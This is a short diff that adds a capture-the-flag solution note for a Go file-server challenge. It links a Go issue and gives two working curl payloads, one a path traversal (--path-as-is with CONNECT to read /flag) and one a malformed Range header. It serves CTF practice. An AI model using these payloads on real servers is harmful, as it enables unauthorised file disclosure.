@@ -1,0 +1,6 @@
+Vulnerability
+	https://github.com/golang/go/issues/40940
+Unintended Solution
+	curl --path-as-is -X CONNECT http://gofs.web.jctf.pro/../flag
+Intended Solution
+	curl -H 'Range: bytes=--1' http://gofs.web.jctf.pro/IMG_1052.jpg
